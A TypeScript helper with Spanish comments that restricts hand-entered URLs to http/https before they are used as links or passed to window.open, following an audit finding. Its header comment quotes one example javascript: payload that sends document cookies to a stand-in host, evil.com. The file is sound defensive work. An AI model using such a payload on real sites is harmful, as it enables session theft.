/**
 * Único punto por el que pasa cualquier URL escrita a mano por una persona
 * (el sitio web de un cliente, el link de un adjunto de proveedor) antes de
 * usarse como `href` o pasarse a `window.open()`. Sin esto, alguien podría
 * guardar algo como `javascript:fetch('https://evil.com?c='+document.cookie)`
 * como "link" y que se ejecute apenas otra persona (o la misma) le dé clic a
 * "Abrir" -- `window.open()`/un `<a href>` sí ejecutan URIs `javascript:`.
 *
 * Auditoría 2026-09-01 (docs/32): se encontró que src/app/(dashboard)/
 * proveedores/ProviderDetail.tsx guardaba y abría el link de un adjunto sin
 * ninguna validación de esquema. cliente.web en ClienteDetail.tsx sí tenía
 * una normalización ad hoc ("agregar https:// si no empieza con http") pero
 * sin esta lista blanca -- quedan unificados acá.
 */
const ESQUEMAS_SEGUROS = new Set(["http:", "https:"]);

/**
 * Devuelve una URL http(s) lista para usar como `href`/`window.open()`, o
 * `null` si el texto no es una URL http(s) válida (incluye cualquier otro
 * esquema: `javascript:`, `data:`, `vbscript:`, `file:`, etc.). Si el texto
 * no trae esquema (ej. "miempresa.com"), asume `https://` -- mismo
 * comportamiento que ya tenía cliente.web, ahora con la lista blanca.
 */
export function toSafeHref(rawUrl: string): string | null {
  const trimmed = rawUrl.trim();
  if (!trimmed) return null;

  const candidate = /^[a-z][a-z0-9+.-]*:\/\//i.test(trimmed) ? trimmed : `https://${trimmed}`;

  let parsed: URL;
  try {
    parsed = new URL(candidate);
  } catch {
    return null;
  }

  return ESQUEMAS_SEGUROS.has(parsed.protocol) ? parsed.href : null;
}
